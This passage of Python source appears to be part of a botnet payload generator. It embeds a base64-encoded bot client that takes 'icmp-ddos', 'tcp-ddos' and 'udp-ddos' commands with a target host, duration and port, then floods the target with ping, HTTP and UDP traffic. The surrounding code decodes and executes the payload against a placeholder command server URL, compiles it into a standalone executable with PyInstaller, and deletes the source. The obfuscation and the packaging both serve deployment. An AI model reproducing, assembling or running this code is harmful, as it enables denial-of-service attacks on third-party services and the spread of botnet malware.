gICAgICAgICAgICAgICAgICAgICAgICBvcy5yZW5hbWUobmV3ZmlsZSxzY3JpcHRubSkKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBzbGVlcCA9IEZhbHNlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAKCiAgICAgICAgICAgICAgICAgICAgICAgIGlmICJpY21wLWRkb3MiIGluIGZpbmQ6CgoKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGJyYyA9IHJlLmZpbmRhbGwocidcWy4qP1xdJywgZmluZCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHN0cmluZyA9IGJyYwogICAgICAgICAgICAgICAgICAgICAgICAgICAgc3RyaW5nID0gc3RyKHN0cmluZykKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHN0cmluZyA9IHN0cmluZy5yZXBsYWNlKCJdIiwiIikKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHN0cmluZyA9IHN0cmluZy5yZXBsYWNlKCJbIiwiIikKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHN0cmluZyA9IHN0cmluZy5yZXBsYWNlKCInIiwiIikKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGJyY2sgPSBzdHJpbmcKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBicmNob3N0ID0gcmUuZmluZGFsbChyJ1woLio/XCknLCBmaW5kKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgc3RyaW5nID0gYnJjaG9zdAogICAgICAgICAgICAgICAgICAgICAgICAgICAgc3RyaW5nID0gc3RyKHN0cmluZykKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHN0cmluZyA9IHN0cmluZy5yZXBsYWNlKCIpIiwiIikKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHN0cmluZyA9IHN0cmluZy5yZXBsYWNlKCIoIiwiIikKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHN0cmluZyA9IHN0cmluZy5yZXBsYWNlKCInIiwiIikKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHN0cmluZyA9IHN0cmluZy5yZXBsYWNlKCJdIiwiIikKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHN0cmluZyA9IHN0cmluZy5yZXBsYWNlKCJbIiwiIikKICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgYnJja2hvc3QgPSBzdHJpbmcKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBwcmludCgiSE9TVDoiLGJyY2tob3N0KQogICAgICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQoIkRVUkFUSU9OOiIsYnJjaykKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB0aW1lb3V0ID0gdGltZS50aW1lKCkgKyBpbnQoYnJjaykKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRocmVhZHMgPSBpbnQoMzApCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBkZWYgbWFpbigpOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHdoaWxlIFRydWU6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIHRpbWUudGltZSgpID4gdGltZW91dDoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBicmVhawogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBwYXNzCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZGVmIHBpbmdfaXAoY3VycmVudF9pcF9hZGRyZXNzKToKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgb3V0cHV0ID0gc3VicHJvY2Vzcy5jaGVja19vdXRwdXQoInBpbmcgLXt9IDEge30iLmZvcm1hdCgnbicgaWYgcGxhdGZvcm0uc3lzdGVtKCkubG93ZXIoCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgKSA9PSAid2luZG93cyIgZWxzZSAnYycsIGN1cnJlbnRfaXBfYWRkcmVzcyApLCBzaGVsbD1UcnVlLCB1bml2ZXJzYWxfbmV3bGluZXM9VHJ1ZSkKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAndW5yZWFjaGFibGUnIGluIG91dHB1dDoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gRmFsc2UKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIFRydWUKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBFOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIEZhbHNlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIF9fbmFtZV9fID09ICdfX21haW5fXyc6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjdXJyZW50X2lwX2FkZHJlc3MgPSBbYnJja2hvc3RdCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZvciBlYWNoIGluIGN1cnJlbnRfaXBfYWRkcmVzczoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIHBpbmdfaXAoZWFjaCk6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgI3ByaW50KCJJQ01QIGlzIGF2YWlsYWJsZSBhbmQgdXAiKSAjdW5jb21tZW50IHRvIHZpZXcgcGFja2V0cyAoZGV2IHRlc3Rpbmcgb25seSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBwYXNzCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICNwcmludCgiSUNNUCBpcyBub3QgYXZhaWxhYmxlIG9yIGRvd24gIikgI3VuY29tbWVudCB0byB2aWV3IHBhY2tldHMgKGRldiB0ZXN0aW5nIG9ubHkpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcGFzcwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgRToKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHByaW50KEUpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBwYXNzCgogICAgICAgICAgICAgICAgICAgICAgICAgICAgZm9yIGkgaW4gcmFuZ2UodGhyZWFkcyk6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgciA9IHRocmVhZGluZy5UaHJlYWQodGFyZ2V0PW1haW4pCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgci5zdGFydCgpCgoKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCgogICAgICAgICAgICAgICAgICAgICAgICBpZiAidGNwLWRkb3MiIGluIGZpbmQ6CgogICAgICAgICAgICAgICAgICAgICAgICAgICAgYnJjID0gcmUuZmluZGFsbChyJ1xbLio/XF0nLCBmaW5kKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgc3RyaW5nID0gYnJjCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBzdHJpbmcgPSBzdHIoc3RyaW5nKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgc3RyaW5nID0gc3RyaW5nLnJlcGxhY2UoIl0iLCAiIikucmVwbGFjZSgiWyIsICIiKS5yZXBsYWNlKCInIiwgIiIpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBicmNrID0gc3RyaW5nCgogICAgICAgICAgICAgICAgICAgICAgICAgICAgYnJjaG9zdCA9IHJlLmZpbmRhbGwocidcKC4qP1wpJywgZmluZCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHN0cmluZyA9IGJyY2hvc3QKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHN0cmluZyA9IHN0cihzdHJpbmcpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBzdHJpbmcgPSBzdHJpbmcucmVwbGFjZSgiKSIsICIiKS5yZXBsYWNlKCIoIiwgIiIpLnJlcGxhY2UoIiciLCAiIikucmVwbGFjZSgiXSIsICIiKS5yZXBsYWNlKCJbIiwgIiIpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBicmNraG9zdCA9IHN0cmluZwoKICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQoIkhPU1Q6IixicmNraG9zdCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHByaW50KCJEVVJBVElPTjoiLGJyY2spCgoKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRpbWVvdXQgPSB0aW1lLnRpbWUoKSArIGludChicmNrKQoKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGRlZiBtYWluKCk6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgd2hpbGUgVHJ1ZToKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgdGltZS50aW1lKCkgPiB0aW1lb3V0OgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQoInRpbWVvdXQgcmVhY2hlZCIpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBicmVhawogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHIgPSByZXF1ZXN0cy5nZXQoImh0dHA6Ly8iK2JyY2tob3N0KQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICNwcmludChyKSAjdW5jb21tZW50IHRvIHZpZXcgcGFja2V0cyAoZGV2IHRlc3Rpbmcgb25seSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgRToKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAjcHJpbnQoRSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBwYXNzCgogICAgICAgICAgICAgICAgICAgICAgICAgICAgZm9yIGkgaW4gcmFuZ2UoNTApOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHQgPSB0aHJlYWRpbmcuVGhyZWFkKHRhcmdldD1tYWluKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHQuc3RhcnQoKQoKCiAgICAgICAgICAgICAgICAgICAgICAgIGlmICJ1ZHAtZGRvcyIgaW4gZmluZDoKCgogICAgICAgICAgICAgICAgICAgICAgICAgICAgYnJjID0gcmUuZmluZGFsbChyJ1xbLio/XF0nLCBmaW5kKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgc3RyaW5nID0gYnJjCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBzdHJpbmcgPSBzdHIoc3RyaW5nKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgc3RyaW5nID0gc3RyaW5nLnJlcGxhY2UoIl0iLCAiIikucmVwbGFjZSgiWyIsICIiKS5yZXBsYWNlKCInIiwgIiIpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBicmNrID0gc3RyaW5nCgogICAgICAgICAgICAgICAgICAgICAgICAgICAgYnJjaG9zdCA9IHJlLmZpbmRhbGwocidcKC4qP1wpJywgZmluZCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHN0cmluZyA9IGJyY2hvc3QKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHN0cmluZyA9IHN0cihzdHJpbmcpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBzdHJpbmcgPSBzdHJpbmcucmVwbGFjZSgiKSIsICIiKS5yZXBsYWNlKCIoIiwgIiIpLnJlcGxhY2UoIiciLCAiIikucmVwbGFjZSgiXSIsICIiKS5yZXBsYWNlKCJbIiwgIiIpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBicmNraG9zdCA9IHN0cmluZwoKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGJyY3BvcnQgPSByZS5maW5kYWxsKHInXHsuKj9cfScsIGZpbmQpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBzdHJpbmcgPSBicmNwb3J0CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBzdHJpbmcgPSBzdHIoc3RyaW5nKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgc3RyaW5nID0gc3RyaW5nLnJlcGxhY2UoIikiLCAiIikucmVwbGFjZSgiKCIsICIiKS5yZXBsYWNlKCInIiwgIiIpLnJlcGxhY2UoIl0iLCAiIikucmVwbGFjZSgiWyIsICIiKS5yZXBsYWNlKCJ9IiwgIiIpLnJlcGxhY2UoInsiLCAiIikKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGJyY3BvcnQgPSBzdHJpbmcKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBwcmludCgiSE9TVDoiLGJyY2tob3N0KQogICAgICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQoIkRVUkFUSU9OOiIsYnJjaykKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHByaW50KCJQT1JUOiIsYnJjcG9ydCkKCgogICAgICAgICAgICAgICAgICAgICAgICAgICAgZGVmIG1haW4oKToKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc29jayA9IHNvY2tldC5zb2NrZXQoc29ja2V0LkFGX0lORVQsIHNvY2tldC5TT0NLX0RHUkFNKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGJ5dGVzID0gcmFuZG9tLl91cmFuZG9tKDEwMjQpCgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRpbWVvdXQgPSB0aW1lLnRpbWUoKSArIGludChicmNrKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHNlbnQgPSAwCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc29jayA9IHNvY2tldAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHdoaWxlIFRydWU6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIHRpbWUudGltZSgpID4gdGltZW91dDoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBwcmludCgidGltZW91dCByZWFjaGVkIikKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBicmVhawogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcGFzcwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBzb2NrID0gc29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCwgc29ja2V0LlNPQ0tfREdSQU0pCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHNvY2suc2VuZHRvKGJ5dGVzLCAoYnJja2hvc3QsIGludChicmNwb3J0KSkpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHNvY2sgPSBzb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULCBzb2NrZXQuU09DS19ER1JBTSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYnl0ZXMgPSByYW5kb20uX3VyYW5kb20oMTApCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHNlbnQgPSBzZW50ICsgMQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAjcHJpbnQoInNlbnQiLHNlbnQsInBhY2tldHMgdG8iLGJyY2tob3N0LCJ0aHJvdWdoIixicmNwb3J0KSAjdW5jb21tZW50IHRvIHZpZXcgcGFja2V0cyAoZGV2IHRlc3Rpbmcgb25seSkKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGV4Y2VwdCBLZXlib2FyZEludGVycnVwdDoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHN5cy5leGl0KCkKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICByID0gdGhyZWFkaW5nLlRocmVhZCh0YXJnZXQ9bWFpbikKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHIuc3RhcnQoKQoKICAgICAgICAgICAgICAgICAgICAKICAgICAgICBleGNlcHQgRXhjZXB0aW9uIGFzIEU6CiAgICAgICAgICAgIHByaW50KEUpCiAgICAgICAgICAgIHBhc3MKCmYxID0gdGhyZWFkaW5nLlRocmVhZCh0YXJnZXQ9c2QpCmYyID0gdGhyZWFkaW5nLlRocmVhZCh0YXJnZXQ9bW4pCgpmMS5zdGFydCgpCmYyLnN0YXJ0KCkK"

decryption_key = "{encryption_key}"
sendtourl = "{full_url}/"

while len(code) % 4 != 0:
    code += '='

decoded_bytes = base64.b64decode(code)
decoded_text = decoded_bytes.decode('utf-8')

print("Using key: ",decryption_key)
print("Using server:",sendtourl)
exec(decoded_text)

'''
        import platform
        
        with open(payload_name, 'w') as file:
            file.write(content)
            file.close


        print("[+]"+payload_name+" Generated")

        print("[%]Compliling "+payload_name)

        op_system = platform.system()

        if op_system == "Linux" or os == "Linux2":
            os.system("pyinstaller --onefile "+payload_name)
            
        if op_system == "Windows":
            os.system("py -m PyInstaller --onefile "+payload_name)
            
        print("[%]Removing "+payload_name+" Source")

        os.remove(payload_name)

        print("[+]Compiled\n")

        
        
                    


                        
                            
                        















                


